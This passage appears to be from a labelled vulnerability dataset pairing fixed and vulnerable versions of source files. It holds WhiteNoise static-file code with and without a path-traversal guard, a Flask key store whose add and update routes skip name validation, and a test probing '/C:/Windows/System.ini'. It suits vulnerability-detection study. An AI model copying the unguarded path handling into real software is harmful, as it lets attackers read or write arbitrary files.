    def test_index_file_served_at_directory_path(self):
        directory_url = self.files.index_url.rpartition('/')[0] + '/'
        response = self.server.get(directory_url)
        self.assertEqual(response.content, self.files.index_content)

    def test_index_file_path_redirected(self):
        directory_url = self.files.index_url.rpartition('/')[0] + '/'
        response = self.server.get(self.files.index_url, allow_redirects=False)
        location = urljoin(self.files.index_url, response.headers['Location'])
        self.assertEqual(response.status_code, 302)
        self.assertEqual(location, directory_url)

    def test_directory_path_without_trailing_slash_redirected(self):
        directory_url = self.files.index_url.rpartition('/')[0] + '/'
        no_slash_url = directory_url.rstrip('/')
        response = self.server.get(no_slash_url, allow_redirects=False)
        location = urljoin(no_slash_url, response.headers['Location'])
        self.assertEqual(response.status_code, 302)
        self.assertEqual(location, directory_url)

    def test_request_initial_bytes(self):
        response = self.server.get(
                self.files.js_url, headers={'Range': 'bytes=0-13'})
        self.assertEqual(response.content, self.files.js_content[0:14])

    def test_request_trailing_bytes(self):
        response = self.server.get(
                self.files.js_url, headers={'Range': 'bytes=-3'})
        self.assertEqual(response.content, self.files.js_content[-3:])

    def test_request_middle_bytes(self):
        response = self.server.get(
                self.files.js_url, headers={'Range': 'bytes=21-30'})
        self.assertEqual(response.content, self.files.js_content[21:31])

    def test_overlong_ranges_truncated(self):
        response = self.server.get(
                self.files.js_url, headers={'Range': 'bytes=21-100000'})
        self.assertEqual(response.content, self.files.js_content[21:])

    def test_overlong_trailing_ranges_return_entire_file(self):
        response = self.server.get(
                self.files.js_url, headers={'Range': 'bytes=-100000'})
        self.assertEqual(response.content, self.files.js_content)

    def test_out_of_range_error(self):
        response = self.server.get(
                self.files.js_url, headers={'Range': 'bytes=10000-11000'})
        self.assertEqual(response.status_code, 416)
        self.assertEqual(
                response.headers['Content-Range'],
                'bytes */%s' % len(self.files.js_content))

    def test_warn_about_missing_directories(self):
        with warnings.catch_warnings(record=True) as warning_list:
            self.application.add_files(u'/dev/null/nosuchdir\u2713')
        self.assertEqual(len(warning_list), 1)

    def test_handles_missing_path_info_key(self):
        response = self.application(
                environ={}, start_response=lambda *args: None)
        self.assertTrue(response)

    def test_cant_read_absolute_paths_on_windows(self):
        response = self.server.get(
            r'/{}/C:/Windows/System.ini'.format(TestServer.PREFIX))
        self.assert_is_default_response(response)

    def assert_is_default_response(self, response):
        self.assertIn('Hello world!', response.text)


class WhiteNoiseAutorefresh(WhiteNoiseTest):

    @classmethod
    def setUpClass(cls):
        cls.files = cls.init_files()
        cls.tmp = tempfile.mkdtemp()
        cls.application = cls.init_application(root=cls.tmp, autorefresh=True)
        cls.server = TestServer(cls.application)
        # Copy in the files *after* initializing server
        copytree(cls.files.directory, cls.tmp)
        super(WhiteNoiseTest, cls).setUpClass()

    def test_no_error_on_very_long_filename(self):
        response = self.server.get('/blah' * 1000)
        self.assertNotEqual(response.status_code, 500)

    def test_warn_about_missing_directories(self):
        # This is the one minor behavioural difference when autorefresh is
        # enabled: we don't warn about missing directories as these can be
        # created after the application is started
        pass

    @classmethod
    def tearDownClass(cls):
        super(WhiteNoiseTest, cls).tearDownClass()
        # Remove temporary directory
        shutil.rmtree(cls.tmp)


def copytree(src, dst):
    for name in os.listdir(src):
        src_path = os.path.join(src, name)
        dst_path = os.path.join(dst, name)
        if os.path.isdir(src_path):
            shutil.copytree(src_path, dst_path)
        else:
            shutil.copy2(src_path, dst_path)


class WhiteNoiseUnitTests(TestCase):

    def test_immutable_file_test_accepts_regex(self):
        instance = WhiteNoise(None, immutable_file_test=r'\.test$')
        self.assertTrue(instance.immutable_file_test('', '/myfile.test'))
        self.assertFalse(instance.immutable_file_test('', 'file.test.txt'))

    @unittest.skipIf(sys.version_info < (3, 4), ""Pathlib was added in Python 3.4"")
    def test_directory_path_can_be_pathlib_instance(self):
        from pathlib import Path
        root = Path(Files('root').directory)
        # Check we can construct instance without it blowing up
        WhiteNoise(None, root=root, autorefresh=True)
/n/n/nwhitenoise/base.py/n/nimport os
from posixpath import normpath
import re
import warnings
from wsgiref.headers import Headers
from wsgiref.util import FileWrapper

from .media_types import MediaTypes
from .scantree import scantree
from .responders import StaticFile, MissingFileError, IsDirectoryError, Redirect
from .string_utils import (decode_if_byte_string, decode_path_info,
                           ensure_leading_trailing_slash)


class WhiteNoise(object):

    # Ten years is what nginx sets a max age if you use 'expires max;'
    # so we'll follow its lead
    FOREVER = 10*365*24*60*60

    # Attributes that can be set by keyword args in the constructor
    config_attrs = ('autorefresh', 'max_age', 'allow_all_origins', 'charset',
                    'mimetypes', 'add_headers_function', 'index_file',
                    'immutable_file_test')
    # Re-check the filesystem on every request so that any changes are
    # automatically picked up. NOTE: For use in development only, not supported
    # in production
    autorefresh = False
    max_age = 60
    # Set 'Access-Control-Allow-Orign: *' header on all files.
    # As these are all public static files this is safe (See
    # http://www.w3.org/TR/cors/#security) and ensures that things (e.g
    # webfonts in Firefox) still work as expected when your static files are
    # served from a CDN, rather than your primary domain.
    allow_all_origins = True
    charset = 'utf-8'
    # Custom mime types
    mimetypes = None
    # Callback for adding custom logic when setting headers
    add_headers_function = None
    # Name of index file (None to disable index support)
    index_file = None

    def __init__(self, application, root=None, prefix=None, **kwargs):
        for attr in self.config_attrs:
            try:
                value = kwargs.pop(attr)
            except KeyError:
                pass
            else:
                value = decode_if_byte_string(value)
                setattr(self, attr, value)
        if kwargs:
            raise TypeError(""Unexpected keyword argument '{0}'"".format(
                list(kwargs.keys())[0]))
        self.media_types = MediaTypes(extra_types=self.mimetypes)
        self.application = application
        self.files = {}
        self.directories = []
        if self.index_file is True:
            self.index_file = 'index.html'
        if not callable(self.immutable_file_test):
            regex = re.compile(self.immutable_file_test)
            self.immutable_file_test = lambda path, url: bool(regex.search(url))
        if root is not None:
            self.add_files(root, prefix)

    def __call__(self, environ, start_response):
        path = decode_path_info(environ.get('PATH_INFO', ''))
        if self.autorefresh:
            static_file = self.find_file(path)
        else:
            static_file = self.files.get(path)
        if static_file is None:
            return self.application(environ, start_response)
        else:
            return self.serve(static_file, environ, start_response)

    @staticmethod
    def serve(static_file, environ, start_response):
        response = static_file.get_response(environ['REQUEST_METHOD'], environ)
        status_line = '{} {}'.format(response.status, response.status.phrase)
        start_response(status_line, list(response.headers))
        if response.file is not None:
            file_wrapper = environ.get('wsgi.file_wrapper', FileWrapper)
            return file_wrapper(response.file)
        else:
            return []

    def add_files(self, root, prefix=None):
        root = decode_if_byte_string(root, force_text=True)
        root = os.path.abspath(root)
        root = root.rstrip(os.path.sep) + os.path.sep
        prefix = decode_if_byte_string(prefix)
        prefix = ensure_leading_trailing_slash(prefix)
        if self.autorefresh:
            # Later calls to `add_files` overwrite earlier ones, hence we need
            # to store the list of directories in reverse order so later ones
            # match first when they're checked in ""autorefresh"" mode
            self.directories.insert(0, (root, prefix))
        else:
            if os.path.isdir(root):
                self.update_files_dictionary(root, prefix)
            else:
                warnings.warn(u'No directory at: {}'.format(root))

    def update_files_dictionary(self, root, prefix):
        # Build a mapping from paths to the results of `os.stat` calls
        # so we only have to touch the filesystem once
        stat_cache = dict(scantree(root))
        for path in stat_cache.keys():
            relative_path = path[len(root):]
            relative_url = relative_path.replace('\\', '/')
            url = prefix + relative_url
            self.add_file_to_dictionary(url, path, stat_cache=stat_cache)

    def add_file_to_dictionary(self, url, path, stat_cache=None):
        if self.is_compressed_variant(path, stat_cache=stat_cache):
            return
        if self.index_file and url.endswith('/' + self.index_file):
            index_url = url[:-len(self.index_file)]
            index_no_slash = index_url.rstrip('/')
            self.files[url] = self.redirect(url, index_url)
            self.files[index_no_slash] = self.redirect(index_no_slash, index_url)
            url = index_url
        static_file = self.get_static_file(path, url, stat_cache=stat_cache)
        self.files[url] = static_file

    def find_file(self, url):
        # Optimization: bail early if the URL can never match a file
        if not self.index_file and url.endswith('/'):
            return
        if not self.url_is_canonical(url):
            return
        for path in self.candidate_paths_for_url(url):
            try:
                return self.find_file_at_path(path, url)
            except MissingFileError:
                pass

    def candidate_paths_for_url(self, url):
        for root, prefix in self.directories:
            if url.startswith(prefix):
                path = os.path.join(root, url[len(prefix):])
                if os.path.commonprefix((root, path)) == root:
                    yield path

    def find_file_at_path(self, path, url):
        if self.is_compressed_variant(path):
            raise MissingFileError(path)
        if self.index_file:
            return self.find_file_at_path_with_indexes(path, url)
        else:
            return self.get_static_file(path, url)

    def find_file_at_path_with_indexes(self, path, url):
        if url.endswith('/'):
            path = os.path.join(path, self.index_file)
            return self.get_static_file(path, url)
        elif url.endswith('/' + self.index_file):
            if os.path.isfile(path):
                return self.redirect(url, url[:-len(self.index_file)])
        else:
            try:
                return self.get_static_file(path, url)
            except IsDirectoryError:
                if os.path.isfile(os.path.join(path, self.index_file)):
                    return self.redirect(url, url + '/')
        raise MissingFileError(path)

    @staticmethod
    def url_is_canonical(url):
        """"""
        Check that the URL path is in canonical format i.e. has normalised
        slashes and no path traversal elements
        """"""
        if '\\' in url:
            return False
        normalised = normpath(url)
        if url.endswith('/') and url != '/':
            normalised += '/'
        return normalised == url

    @staticmethod
    def is_compressed_variant(path, stat_cache=None):
        if path[-3:] in ('.gz', '.br'):
            uncompressed_path = path[:-3]
            if stat_cache is None:
                return os.path.isfile(uncompressed_path)
            else:
                return uncompressed_path in stat_cache
        return False

    def get_static_file(self, path, url, stat_cache=None):
        # Optimization: bail early if file does not exist
        if stat_cache is None and not os.path.exists(path):
            raise MissingFileError(path)
        headers = Headers([])
        self.add_mime_headers(headers, path, url)
        self.add_cache_headers(headers, path, url)
        if self.allow_all_origins:
            headers['Access-Control-Allow-Origin'] = '*'
        if self.add_headers_function:
            self.add_headers_function(headers, path, url)
        return StaticFile(
                path, headers.items(),
                stat_cache=stat_cache,
                encodings={
                  'gzip': path + '.gz', 'br': path + '.br'})

    def add_mime_headers(self, headers, path, url):
        media_type = self.media_types.get_type(path)
        if (media_type.startswith('text/') or
                media_type == 'application/javascript'):
            params = {'charset': str(self.charset)}
        else:
            params = {}
        headers.add_header('Content-Type', str(media_type), **params)

    def add_cache_headers(self, headers, path, url):
        if self.immutable_file_test(path, url):
            headers['Cache-Control'] = \
                    'max-age={0}, public, immutable'.format(self.FOREVER)
        elif self.max_age is not None:
            headers['Cache-Control'] = \
                    'max-age={0}, public'.format(self.max_age)

    def immutable_file_test(self, path, url):
        """"""
        This should be implemented by sub-classes (see e.g. WhiteNoiseMiddleware)
        or by setting the `immutable_file_test` config option
        """"""
        return False

    def redirect(self, from_url, to_url):
        """"""
        Return a relative 302 redirect

        We use relative redirects as we don't know the absolute URL the app is
        being hosted under
        """"""
        if to_url == from_url + '/':
            relative_url = from_url.split('/')[-1] + '/'
        elif from_url == to_url + self.index_file:
            relative_url = './'
        else:
            raise ValueError(
                    'Cannot handle redirect: {} > {}'.format(from_url, to_url))
        if self.max_age is not None:
            headers = {
                'Cache-Control': 'max-age={0}, public'.format(self.max_age)}
        else:
            headers = {}
        return Redirect(relative_url, headers=headers)
/n/n/n",0
117,4d8a3ab1e97d7ddb18b3fa8b4909c92bad5529c6,"/whitenoise/base.py/n/nimport os
from posixpath import normpath
import re
import warnings
from wsgiref.headers import Headers
from wsgiref.util import FileWrapper

from .media_types import MediaTypes
from .scantree import scantree
from .responders import StaticFile, MissingFileError, IsDirectoryError, Redirect
from .string_utils import (decode_if_byte_string, decode_path_info,
                           ensure_leading_trailing_slash)


class WhiteNoise(object):

    # Ten years is what nginx sets a max age if you use 'expires max;'
    # so we'll follow its lead
    FOREVER = 10*365*24*60*60

    # Attributes that can be set by keyword args in the constructor
    config_attrs = ('autorefresh', 'max_age', 'allow_all_origins', 'charset',
                    'mimetypes', 'add_headers_function', 'index_file',
                    'immutable_file_test')
    # Re-check the filesystem on every request so that any changes are
    # automatically picked up. NOTE: For use in development only, not supported
    # in production
    autorefresh = False
    max_age = 60
    # Set 'Access-Control-Allow-Orign: *' header on all files.
    # As these are all public static files this is safe (See
    # http://www.w3.org/TR/cors/#security) and ensures that things (e.g
    # webfonts in Firefox) still work as expected when your static files are
    # served from a CDN, rather than your primary domain.
    allow_all_origins = True
    charset = 'utf-8'
    # Custom mime types
    mimetypes = None
    # Callback for adding custom logic when setting headers
    add_headers_function = None
    # Name of index file (None to disable index support)
    index_file = None

    def __init__(self, application, root=None, prefix=None, **kwargs):
        for attr in self.config_attrs:
            try:
                value = kwargs.pop(attr)
            except KeyError:
                pass
            else:
                value = decode_if_byte_string(value)
                setattr(self, attr, value)
        if kwargs:
            raise TypeError(""Unexpected keyword argument '{0}'"".format(
                list(kwargs.keys())[0]))
        self.media_types = MediaTypes(extra_types=self.mimetypes)
        self.application = application
        self.files = {}
        self.directories = []
        if self.index_file is True:
            self.index_file = 'index.html'
        if not callable(self.immutable_file_test):
            regex = re.compile(self.immutable_file_test)
            self.immutable_file_test = lambda path, url: bool(regex.search(url))
        if root is not None:
            self.add_files(root, prefix)

    def __call__(self, environ, start_response):
        path = decode_path_info(environ.get('PATH_INFO', ''))
        if self.autorefresh:
            static_file = self.find_file(path)
        else:
            static_file = self.files.get(path)
        if static_file is None:
            return self.application(environ, start_response)
        else:
            return self.serve(static_file, environ, start_response)

    @staticmethod
    def serve(static_file, environ, start_response):
        response = static_file.get_response(environ['REQUEST_METHOD'], environ)
        status_line = '{} {}'.format(response.status, response.status.phrase)
        start_response(status_line, list(response.headers))
        if response.file is not None:
            file_wrapper = environ.get('wsgi.file_wrapper', FileWrapper)
            return file_wrapper(response.file)
        else:
            return []

    def add_files(self, root, prefix=None):
        root = decode_if_byte_string(root, force_text=True)
        root = root.rstrip(os.path.sep) + os.path.sep
        prefix = decode_if_byte_string(prefix)
        prefix = ensure_leading_trailing_slash(prefix)
        if self.autorefresh:
            # Later calls to `add_files` overwrite earlier ones, hence we need
            # to store the list of directories in reverse order so later ones
            # match first when they're checked in ""autorefresh"" mode
            self.directories.insert(0, (root, prefix))
        else:
            if os.path.isdir(root):
                self.update_files_dictionary(root, prefix)
            else:
                warnings.warn(u'No directory at: {}'.format(root))

    def update_files_dictionary(self, root, prefix):
        # Build a mapping from paths to the results of `os.stat` calls
        # so we only have to touch the filesystem once
        stat_cache = dict(scantree(root))
        for path in stat_cache.keys():
            relative_path = path[len(root):]
            relative_url = relative_path.replace('\\', '/')
            url = prefix + relative_url
            self.add_file_to_dictionary(url, path, stat_cache=stat_cache)

    def add_file_to_dictionary(self, url, path, stat_cache=None):
        if self.is_compressed_variant(path, stat_cache=stat_cache):
            return
        if self.index_file and url.endswith('/' + self.index_file):
            index_url = url[:-len(self.index_file)]
            index_no_slash = index_url.rstrip('/')
            self.files[url] = self.redirect(url, index_url)
            self.files[index_no_slash] = self.redirect(index_no_slash, index_url)
            url = index_url
        static_file = self.get_static_file(path, url, stat_cache=stat_cache)
        self.files[url] = static_file

    def find_file(self, url):
        # Optimization: bail early if the URL can never match a file
        if not self.index_file and url.endswith('/'):
            return
        if not self.url_is_canonical(url):
            return
        for path in self.candidate_paths_for_url(url):
            try:
                return self.find_file_at_path(path, url)
            except MissingFileError:
                pass

    def candidate_paths_for_url(self, url):
        for root, prefix in self.directories:
            if url.startswith(prefix):
                yield os.path.join(root, url[len(prefix):])

    def find_file_at_path(self, path, url):
        if self.is_compressed_variant(path):
            raise MissingFileError(path)
        if self.index_file:
            return self.find_file_at_path_with_indexes(path, url)
        else:
            return self.get_static_file(path, url)

    def find_file_at_path_with_indexes(self, path, url):
        if url.endswith('/'):
            path = os.path.join(path, self.index_file)
            return self.get_static_file(path, url)
        elif url.endswith('/' + self.index_file):
            if os.path.isfile(path):
                return self.redirect(url, url[:-len(self.index_file)])
        else:
            try:
                return self.get_static_file(path, url)
            except IsDirectoryError:
                if os.path.isfile(os.path.join(path, self.index_file)):
                    return self.redirect(url, url + '/')
        raise MissingFileError(path)

    @staticmethod
    def url_is_canonical(url):
        """"""
        Check that the URL path does not contain any elements which might be
        used in a path traversal attack
        """"""
        if '\\' in url:
            return False
        normalised = normpath(url)
        if url.endswith('/') and url != '/':
            normalised += '/'
        return normalised == url

    @staticmethod
    def is_compressed_variant(path, stat_cache=None):
        if path[-3:] in ('.gz', '.br'):
            uncompressed_path = path[:-3]
            if stat_cache is None:
                return os.path.isfile(uncompressed_path)
            else:
                return uncompressed_path in stat_cache
        return False

    def get_static_file(self, path, url, stat_cache=None):
        # Optimization: bail early if file does not exist
        if stat_cache is None and not os.path.exists(path):
            raise MissingFileError(path)
        headers = Headers([])
        self.add_mime_headers(headers, path, url)
        self.add_cache_headers(headers, path, url)
        if self.allow_all_origins:
            headers['Access-Control-Allow-Origin'] = '*'
        if self.add_headers_function:
            self.add_headers_function(headers, path, url)
        return StaticFile(
                path, headers.items(),
                stat_cache=stat_cache,
                encodings={
                  'gzip': path + '.gz', 'br': path + '.br'})

    def add_mime_headers(self, headers, path, url):
        media_type = self.media_types.get_type(path)
        if (media_type.startswith('text/') or
                media_type == 'application/javascript'):
            params = {'charset': str(self.charset)}
        else:
            params = {}
        headers.add_header('Content-Type', str(media_type), **params)

    def add_cache_headers(self, headers, path, url):
        if self.immutable_file_test(path, url):
            headers['Cache-Control'] = \
                    'max-age={0}, public, immutable'.format(self.FOREVER)
        elif self.max_age is not None:
            headers['Cache-Control'] = \
                    'max-age={0}, public'.format(self.max_age)

    def immutable_file_test(self, path, url):
        """"""
        This should be implemented by sub-classes (see e.g. WhiteNoiseMiddleware)
        or by setting the `immutable_file_test` config option
        """"""
        return False

    def redirect(self, from_url, to_url):
        """"""
        Return a relative 302 redirect

        We use relative redirects as we don't know the absolute URL the app is
        being hosted under
        """"""
        if to_url == from_url + '/':
            relative_url = from_url.split('/')[-1] + '/'
        elif from_url == to_url + self.index_file:
            relative_url = './'
        else:
            raise ValueError(
                    'Cannot handle redirect: {} > {}'.format(from_url, to_url))
        if self.max_age is not None:
            headers = {
                'Cache-Control': 'max-age={0}, public'.format(self.max_age)}
        else:
            headers = {}
        return Redirect(relative_url, headers=headers)
/n/n/n",1
118,7c665e556987f4e2c1a75e143a1e80ae066ad833,"impl.py/n/nfrom flask import request
import jwt
import re
import os
from base64 import b64encode, b64decode

import HybridRSA

# Cache server keys because they don't change during program operation
SERVER_JWT_PRIVATE_KEY = open('resources/jwt_key', 'rb').read()
SERVER_JWT_PUBLIC_KEY  = open('resources/jwt_key.pub', 'rb').read()

# HTTP response codes
CREATED = 201
BAD_REQUEST = 400
NOT_FOUND = 404

KEY_SIZE_LIMIT = int(1e4)

def getKey(client):
	""""""Retrieves the specified key for the specified client
	Returns an error if the key doesn't exist, obviously.
	""""""
	global SERVER_JWT_PRIVATE_KEY
	global BAD_REQUEST

	validateClient(client)
	client_pub_key = loadClientRSAKey(client)
	token_data = decodeRequestToken(request.data, client_pub_key)
	validateKeyName(token_data['key'])

	# Keys may only have alpha-numeric names
	try:
		requested_key = open('keys/%s/%s.key' % (client, token_data['key']), 'r').read()
	except KeyError:
		raise FoxlockError(BAD_REQUEST, ""JWT did not contain attribute 'key'"")
	except IOError:
		raise FoxlockError(BAD_REQUEST, ""Key '%s' not found"" % token_data['key'])

	# Key is returned in a JWT encrypted with the client's public key, so only they can decrypt it
	keytoken = packJWT({'key': requested_key}, SERVER_JWT_PRIVATE_KEY, client_pub_key)

	return keytoken

def addKey(client):
	""""""Adds a new key with the specified name and contents.
	Returns an error if a key with the specified name already exists.
	""""""
	global BAD_REQUEST
	global CREATED

	validateClient(client)
	client_pub_key = loadClientRSAKey(client)
	token_data = decodeRequestToken(request.data, client_pub_key)
	validateNewKeyData(token_data)
	validateKeyName(token_data['name'])

	# Use 'x' flag so we can throw an error if a key with this name already exists
	try:
		with open('keys/%s/%s.key' % (client, token_data['name']), 'x') as f:
			f.write(token_data['key'])
	except FileExistsError:
		raise FoxlockError(BAD_REQUEST, ""Key '%s' already exists"" % token_data['name'])

	return 'Key successfully created', CREATED

def updateKey(client):
	""""""Updates the contents of a key that already exists in our system.
	Returns an error if the specified key doesn't exist for the specified user.
	""""""
	global NOT_FOUND
	global CREATED

	validateClient(client)
	client_pub_key = loadClientRSAKey(client)
	token_data = decodeRequestToken(request.data, client_pub_key)
	validateNewKeyData(token_data)
	validateKeyName(token_data['name'])

	# Use 'w' flag to replace existing key file with the new key data
	if os.path.isfile('keys/%s/%s.key' % (client, token_data['name'])):
		with open('keys/%s/%s.key' % (client, token_data['name']), 'w') as f:
			f.write(token_data['key'])
	else:
		raise FoxlockError(NOT_FOUND, ""Key '%s' not found"" % token_data['name'])

	return 'Key successfully updated', CREATED

def deleteKey(client):
	""""""Deletes the specified key.
	Returns an error if the key doesn't exist
	""""""
	global NOT_FOUND

	validateClient(client)
	client_pub_key = loadClientRSAKey(client)
	token_data = decodeRequestToken(request.data, client_pub_key)
	validateKeyName(token_data['key'])

	try:
		os.remove('keys/%s/%s.key' % (client, token_data['key']))
	except FileNotFoundError:
		raise FoxlockError(NOT_FOUND, ""Key '%s' not found"" % token_data['key'])

	return ""Key '%s' successfully deleted"" % token_data['key']

def getJwtKey():
	""""""Simply returns the RSA public key the server uses to sign JWTs""""""
	global SERVER_JWT_PUBLIC_KEY
	return SERVER_JWT_PUBLIC_KEY

##################
# Helper Functions
##################

def validateClient(client):
	global BAD_REQUEST
	global NOT_FOUND

	if re.search('[^a-zA-Z0-9]', client):
		raise FoxlockError(BAD_REQUEST, 'Client may only have alpha-numeric names')
	if not os.path.isdir('keys/' + client):
		raise FoxlockError(NOT_FOUND, ""Client '%s' not found"" % client)

def loadClientRSAKey(client):
	""""""Load a client's RSA public key, if they exist in our system""""""
	global NOT_FOUND

	try:
		key = open('keys/%s/key_rsa.pub' % client, 'rb').read()
	except IOError:
		raise FoxlockError(NOT_FOUND, 'Client RSA public key not found')
	return key

def decodeRequestToken(token, client_pub_key):
	""""""Decrypts / decodes the request's JWT with the server's JWT private key.""""""
	global SERVER_JWT_PRIVATE_KEY
	global BAD_REQUEST

	if token is None:
		raise FoxlockError(BAD_REQUEST, 'No token found in request')

	# Most JWT errors will come from clients signing JWTs with the wrong key
	try:
		decoded_token_data = unpackJWT(token, client_pub_key, SERVER_JWT_PRIVATE_KEY)
	except jwt.exceptions.DecodeError:
		raise FoxlockError(BAD_REQUEST, 'Failed to decode JWT. Are you using the right key?')
	except jwt.exceptions.InvalidTokenError:
		raise FoxlockError(BAD_REQUEST, 'JWT is malformed')
	return decoded_token_data

def validateNewKeyData(data):
	""""""Verify the request key name and key data are valid""""""
	global BAD_REQUEST
	global KEY_SIZE_LIMIT

	try:
		data['name']
		data['key']
	except KeyError:
		raise FoxlockError(BAD_REQUEST, ""Token data must include 'key' and 'name'"")

	if len(data['key']) > KEY_SIZE_LIMIT:
		raise FoxlockError(BAD_REQUEST, 'Key size limited to %s bytes' % KEY_SIZE_LIMIT)

def validateKeyName(name):
	""""""Ensures key names are alpha-numeric""""""
	global BAD_REQUEST

	if re.search('[^a-zA-Z0-9]', name):
		raise FoxlockError(BAD_REQUEST, 'Invalid key name')

# We've switched JWT libraries 3 times in one week, so let's just wrap JWT functionality

def packJWT(data, sign_key, encrypt_key):
	""""""Encrypt/encode in a compact statement""""""
	token = jwt.encode(data, sign_key, algorithm='RS256')
	enc_token = HybridRSA.encrypt(token, encrypt_key)
	return b64encode(enc_token).decode('utf-8')

def unpackJWT(encoded_jwt, verify_key, decrypt_key):
	""""""Decode/Decrypt in a compact statement""""""
	decoded = b64decode(encoded_jwt)
	dec_token = HybridRSA.decrypt(decoded, decrypt_key)
	token = jwt.decode(dec_token, verify_key, algorithm='RS256')
	return token


class FoxlockError(Exception):
	""""""This gives us a general purpose error Flask can catch""""""
	def __init__(self, code, message):
		self.message = message
		self.code = code

/n/n/n",0
119,7c665e556987f4e2c1a75e143a1e80ae066ad833,"/impl.py/n/nfrom flask import request
import jwt
import re
import os
from base64 import b64encode, b64decode

import HybridRSA

# Cache server keys because they don't change during program operation
SERVER_JWT_PRIVATE_KEY = open('resources/jwt_key', 'rb').read()
SERVER_JWT_PUBLIC_KEY  = open('resources/jwt_key.pub', 'rb').read()

# HTTP response codes
CREATED = 201
BAD_REQUEST = 400
NOT_FOUND = 404

KEY_SIZE_LIMIT = int(1e4)

def getKey(client):
	""""""Retrieves the specified key for the specified client
	Returns an error if the key doesn't exist, obviously.
	""""""
	global SERVER_JWT_PRIVATE_KEY
	global BAD_REQUEST

	validateClient(client)

	client_pub_key = loadClientRSAKey(client)
	token_data = decodeRequestToken(request.data, client_pub_key)

	# Keys may only have alpha-numeric names
	try:
		if re.search('[^a-zA-Z0-9]', token_data['key']):
			raise FoxlockError(BAD_REQUEST, 'Invalid key requested')
		requested_key = open('keys/%s/%s.key' % (client, token_data['key']), 'r').read()
	except KeyError:
		raise FoxlockError(BAD_REQUEST, ""JWT did not contain attribute 'key'"")
	except IOError:
		raise FoxlockError(BAD_REQUEST, ""Key '%s' not found"" % token_data['key'])

	# Key is returned in a JWT encrypted with the client's public key, so only they can decrypt it
	keytoken = packJWT({'key': requested_key}, SERVER_JWT_PRIVATE_KEY, client_pub_key)

	return keytoken

def addKey(client):
	""""""Adds a new key with the specified name and contents.
	Returns an error if a key with the specified name already exists.
	""""""
	global BAD_REQUEST
	global CREATED

	validateClient(client)

	client_pub_key = loadClientRSAKey(client)
	token_data = decodeRequestToken(request.data, client_pub_key)
	validateNewKeyData(token_data)

	# Use 'x' flag so we can throw an error if a key with this name already exists
	try:
		with open('keys/%s/%s.key' % (client, token_data['name']), 'x') as f:
			f.write(token_data['key'])
	except FileExistsError:
		raise FoxlockError(BAD_REQUEST, ""Key '%s' already exists"" % token_data['name'])

	return 'Key successfully created', CREATED

def updateKey(client):
	""""""Updates the contents of a key that already exists in our system.
	Returns an error if the specified key doesn't exist for the specified user.
	""""""
	global NOT_FOUND
	global CREATED

	validateClient(client)

	client_pub_key = loadClientRSAKey(client)
	token_data = decodeRequestToken(request.data, client_pub_key)
	validateNewKeyData(token_data)

	# Use 'w' flag to replace existing key file with the new key data
	if os.path.isfile('keys/%s/%s.key' % (client, token_data['name'])):
		with open('keys/%s/%s.key' % (client, token_data['name']), 'w') as f:
			f.write(token_data['key'])
	else:
		raise FoxlockError(NOT_FOUND, ""Key '%s' not found"" % token_data['name'])

	return 'Key successfully updated', CREATED

def deleteKey(client):
	""""""Deletes the specified key.
	Returns an error if the key doesn't exist
	""""""
	global BAD_REQUEST
	global NOT_FOUND

	validateClient(client)

	client_pub_key = loadClientRSAKey(client)
	token_data = decodeRequestToken(request.data, client_pub_key)

	if re.search('[^a-zA-Z0-9]', token_data['key']):
		raise FoxlockError(BAD_REQUEST, 'Invalid key requested')

	try:
		os.remove('keys/%s/%s.key' % (client, token_data['key']))
	except FileNotFoundError:
		raise FoxlockError(NOT_FOUND, ""Key '%s' not found"" % token_data['key'])

	return ""Key '%s' successfully deleted"" % token_data['key']

def getJwtKey():
	""""""Simply returns the RSA public key the server uses to sign JWTs""""""
	global SERVER_JWT_PUBLIC_KEY
	return SERVER_JWT_PUBLIC_KEY

##################
# Helper Functions
##################

def validateClient(client):
	global BAD_REQUEST
	global NOT_FOUND

	if re.search('[^a-zA-Z0-9]', client):
		raise FoxlockError(BAD_REQUEST, 'Client may only have alpha-numeric names')
	if not os.path.isdir('keys/' + client):
		raise FoxlockError(NOT_FOUND, ""Client '%s' not found"" % client)

def loadClientRSAKey(client):
	""""""Load a client's RSA public key, if they exist in our system""""""
	global NOT_FOUND

	try:
		key = open('keys/%s/key_rsa.pub' % client, 'rb').read()
	except IOError:
		raise FoxlockError(NOT_FOUND, 'Client RSA public key not found')
	return key

def decodeRequestToken(token, client_pub_key):
	""""""Decrypts / decodes the request's JWT with the server's JWT private key.""""""
	global SERVER_JWT_PRIVATE_KEY
	global BAD_REQUEST

	if token is None:
		raise FoxlockError(BAD_REQUEST, 'No token found in request')

	# Most JWT errors will come from clients signing JWTs with the wrong key
	try:
		decoded_token_data = unpackJWT(token, client_pub_key, SERVER_JWT_PRIVATE_KEY)
	except jwt.exceptions.DecodeError:
		raise FoxlockError(BAD_REQUEST, 'Failed to decode JWT. Are you using the right key?')
	except jwt.exceptions.InvalidTokenError:
		raise FoxlockError(BAD_REQUEST, 'JWT is malformed')
	return decoded_token_data

def validateNewKeyData(data):
	""""""Verify the request key name and key data are valid""""""
	global BAD_REQUEST
	global KEY_SIZE_LIMIT

	try:
		data['name']
		data['key']
	except KeyError:
		raise FoxlockError(BAD_REQUEST, ""Token data must include 'key' and 'name'"")

	if len(data['key']) > KEY_SIZE_LIMIT:
		raise FoxlockError(BAD_REQUEST, 'Key size limited to %s bytes' % KEY_SIZE_LIMIT)


# We've switched JWT libraries 3 times in one week, so let's just wrap JWT functionality

def packJWT(data, sign_key, encrypt_key):
	""""""Encrypt/encode in a compact statement""""""
	token = jwt.encode(data, sign_key, algorithm='RS256')
	enc_token = HybridRSA.encrypt(token, encrypt_key)
	return b64encode(enc_token).decode('utf-8')

def unpackJWT(encoded_jwt, verify_key, decrypt_key):
	""""""Decode/Decrypt in a compact statement""""""
	decoded = b64decode(encoded_jwt)
	dec_token = HybridRSA.decrypt(decoded, decrypt_key)
	token = jwt.decode(dec_token, verify_key, algorithm='RS256')
	return token


class FoxlockError(Exception):
	""""""This gives us a general purpose error Flask can catch""""""
	def __init__(self, code, message):
		self.message = message
		self.code = code

/n/n/n",1
120,a4989b4e38c2f3d0c225d04ce3213ba271a5ef08,"nestedfacts.py/n/n#!/usr/bin/env python

import os
import os.path
import json
import sys
import yaml


def _load_yml_filedir(path):
    """"""
    Internal function. Do not use.
    Loads all YML-files from the given directory, recursively.
    """"""
    YML_FILE_SUFFIX = '.yml'
    bpath = os.path.basename(path)

    if os.path.isdir(path):
        result = {}

        for entry in os.listdir(path):
            epath = os.path.join(path, entry)
            key, value = _load_yml_filedir(epath)

            if not key:
              continue

            result[key] = value

        return bpath, result
